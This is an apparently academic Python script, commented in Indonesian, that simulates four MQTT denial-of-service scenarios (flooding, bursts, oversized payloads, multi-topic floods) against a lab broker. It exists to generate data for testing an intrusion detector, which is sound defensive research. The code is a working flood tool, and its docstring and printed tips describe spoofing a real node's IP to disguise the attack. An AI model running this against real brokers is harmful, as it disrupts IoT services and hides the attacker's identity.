#!/usr/bin/env python3
"""MINT - Simulator serangan DoS S1-S4 (dijalankan dari mesin PENYERANG).

Empat skenario sesuai Bab 4 proposal:
  S1  High-frequency publish (flooding)
      Node/target dikirim puluhan-ratusan PUBLISH per detik selama +-60 dtk.
  S2  Message burst
      Rentetan burst 50 pesan @100 msg/dtk dengan jeda acak 5-15 detik.
  S3  Payload abnormal / oversized
      Publish payload >200 KB (acak 200-300 KB) — sesuai Tabel 3.6.2 proposal.
  S4  Multi-device burst
      4 topik node serentak flooding +-10 detik.

Pemakaian (di laptop penyerang, bukan laptop server):
  python scripts/attack_sim.py S1
  python scripts/attack_sim.py S1 --rate 150 --duration 60
  python scripts/attack_sim.py S2 --duration 90
  python scripts/attack_sim.py S3 --target iot/kamera --size 250
  python scripts/attack_sim.py S4 --duration 10 --rate 50
  python scripts/attack_sim.py --list

Alur pengujian lengkap (di laptop SERVER):
  1. mulai_stack.bat  (Mosquitto + InfluxDB + Grafana)
  2. python scripts/run_session.py S1 120     # rekam pcap + analyzer + dataset
  3. jalankan attack_sim.py S1 di laptop penyerang
  4. setelah selesai: dataset_S1.csv + captures/S1.pcap siap utk Bab 6
     grafik: python scripts/plot_compare.py data/dataset_BASE.csv data/dataset_S1.csv

CATATAN ATRIBUSI IP:
  Analyzer mengenali perangkat dari IP sumber paket. Dua mode pengujian:
  * Mode bebas  : IP laptop penyerang -> tampil sebagai node "TAK TERDAFTAR"
                  (menguji deteksi injeksi perangkat asing).
  * Mode menyamar: matikan node fisiknya lalu set IP statis laptop penyerang
                  = IP node tsb (mis. 192.168.7.101) -> serangan tercatat
                  sebagai node itu, persis seperti data demo_serangan.csv.
"""
import argparse
import json
import os
import random
import socket
import sys
import threading
import time

try:
    import paho.mqtt.client as mqtt
    from paho.mqtt.enums import CallbackAPIVersion
except ImportError:
    print("[!] paho-mqtt belum terpasang: pip install paho-mqtt")
    sys.exit(1)

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def broker_dari_registry():
    try:
        with open(os.path.join(ROOT, "devices.json"), encoding="utf-8") as f:
            return json.load(f).get("broker_ip", "192.168.7.101")
    except OSError:
        return "192.168.7.101"


TOPIK_NODE = ["iot/suhu", "iot/jarak", "iot/kamera", "iot/cahaya"]

skenario = {
    "S1": dict(nama="High-frequency publish (flooding)",
               target="iot/suhu", rate=100, duration=60),
    "S2": dict(nama="Message burst (50 pesan @100 msg/dtk, jeda acak)",
               target="iot/suhu", rate=100, duration=90),
    "S3": dict(nama="Payload abnormal / oversized (>200 KB, sesuai proposal)",
               target="iot/kamera", rate=1, duration=60),
    "S4": dict(nama="Multi-device burst (4 topik serentak)",
               target=None, rate=50, duration=10),
}


def ip_lokal():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "?"


class Penyerang:
    def __init__(self, host, port=1883):
        self.cl = mqtt.Client(CallbackAPIVersion.VERSION2,
                              client_id=f"mint-attack-{random.randint(1000,9999)}")
        self.cl.connect(host, port, keepalive=30)
        self.cl.loop_start()
        self.host = host
        self.kirim = 0
        self.lock = threading.Lock()

    def kirim_payload(self, topic, payload, qos=0):
        self.cl.publish(topic, payload, qos=qos)
        with self.lock:
            self.kirim += 1

    def selesai(self):
        self.cl.loop_stop()
        self.cl.disconnect()


def jalankan_s1(cl, cfg):
    """Flooding: rate pesan/detik konstan selama durasi."""
    topic = cfg["target"]
    rate, dur = cfg["rate"], cfg["duration"]
    jeda = 1.0 / rate
    print(f"[S1] flooding {topic} @ {rate} msg/dtk selama {dur} dtk ...")
    end = time.time() + dur
    while time.time() < end:
        cl.kirim_payload(topic, json.dumps({"suhu": round(random.uniform(80, 99), 1)}))
        time.sleep(jeda)


def jalankan_s2(cl, cfg):
    """Burst: 50 pesan @100 msg/dtk lalu jeda acak 5-15 dtk, berulang."""
    topic = cfg["target"]
    dur = cfg["duration"]
    print(f"[S2] burst berulang pada {topic} selama total {dur} dtk ...")
    end = time.time() + dur
    n_burst = 0
    while time.time() < end:
        n_burst += 1
        t0 = time.time()
        for _ in range(50):
            cl.kirim_payload(topic, json.dumps(
                {"suhu": round(random.uniform(80, 99), 1)}))
            time.sleep(0.01)
        print(f"     burst #{n_burst}: 50 pesan dalam "
              f"{time.time()-t0:.2f} dtk")
        if time.time() >= end:
            break
        time.sleep(random.uniform(5, 15))


def jalankan_s3(cl, cfg):
    """Payload oversized: >200 KB (atau --size KB tetap) tiap detik."""
    topic = cfg["target"]
    dur = cfg["duration"]
    size_kb = cfg.get("size")
    print(f"[S3] payload besar pada {topic} selama {dur} dtk ...")
    end = time.time() + dur
    while time.time() < end:
        kb = size_kb if size_kb else random.randint(200, 300)
        cl.kirim_payload(topic, os.urandom(kb * 1024))
        print(f"     kirim {kb} KB")
        time.sleep(1.0)


def jalankan_s4(cl, cfg):
    """Multi-device: 4 topik serentak flooding."""
    rate, dur = cfg["rate"], cfg["duration"]
    print(f"[S4] {len(TOPIK_NODE)} topik serentak @ {rate} msg/dtk "
          f"selama {dur} dtk ...")

    def banjir(topic):
        end = time.time() + dur
        jeda = 1.0 / rate
        while time.time() < end:
            cl.kirim_payload(topic, json.dumps({"nilai": random.randint(0, 99)}))
            time.sleep(jeda)

    threads = [threading.Thread(target=banjir, args=(t,)) for t in TOPIK_NODE]
    for t in threads:
        t.start()
    for t in threads:
        t.join()


def main():
    ap = argparse.ArgumentParser(
        description="Simulator serangan DoS S1-S4 MINT (jalankan di mesin penyerang)",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("skenario", nargs="?", choices=sorted(skenario),
                    help="kode skenario: S1 / S2 / S3 / S4")
    ap.add_argument("--list", action="store_true", help="daftar skenario lalu keluar")
    ap.add_argument("--host", default=broker_dari_registry(),
                    help=f"IP broker (default dari devices.json: {broker_dari_registry()})")
    ap.add_argument("--port", type=int, default=1883)
    ap.add_argument("--target", default=None,
                    help="topik target (default: iot/suhu; S4 = 4 topik node)")
    ap.add_argument("--rate", type=int, default=None,
                    help="pesan per detik (default per skenario)")
    ap.add_argument("--duration", type=int, default=None,
                    help="durasi detik (default per skenario)")
    ap.add_argument("--size", type=int, default=None,
                    help="S3: ukuran payload KB tetap (default acak 200-300)")
    args = ap.parse_args()

    if args.list or not args.skenario:
        print("Skenario serangan MINT:")
        for k in sorted(skenario):
            v = skenario[k]
            print(f"  {k}: {v['nama']}")
            print(f"      default: rate={v['rate']}/s  durasi={v['duration']} dtk  "
                  f"target={v['target'] or '4 topik node'}")
        if not args.skenario:
            print("\nContoh: python scripts/attack_sim.py S1 --rate 150 --duration 60")
        return

    cfg = dict(skenario[args.skenario])
    if args.target:
        cfg["target"] = args.target
    if args.rate:
        cfg["rate"] = args.rate
    if args.duration:
        cfg["duration"] = args.duration
    if args.size:
        cfg["size"] = args.size

    print("=" * 60)
    print(f" MINT attack_sim - {args.skenario}: {cfg['nama']}")
    print(f" Broker   : {args.host}:{args.port}")
    print(f" IP saya  : {ip_lokal()}  (analyzer melihat perangkat dari IP ini)")
    print("=" * 60)
    print(" Tips menyamar sebagai node: matikan node fisik lalu set IP statis")
    print(" laptop ini = IP node (mis. 192.168.7.101) sebelum menjalankan serangan.")
    print("=" * 60)

    cl = Penyerang(args.host, args.port)
    t0 = time.time()
    try:
        {"S1": jalankan_s1, "S2": jalankan_s2,
         "S3": jalankan_s3, "S4": jalankan_s4}[args.skenario](cl, cfg)
    except KeyboardInterrupt:
        print("\n[!] dihentikan pengguna (Ctrl+C)")
    finally:
        durasi = time.time() - t0
        print("-" * 60)
        print(f"[SELESAI] total {cl.kirim} pesan dalam {durasi:.1f} dtk "
              f"(efektif {cl.kirim/durasi:.1f} msg/dtk)")
        cl.selesai()
        print("[i] Cek dashboard (halaman Anomali & Dataset) dan alerts.jsonl "
              "di laptop server untuk hasil deteksinya.")


if __name__ == "__main__":
    main()
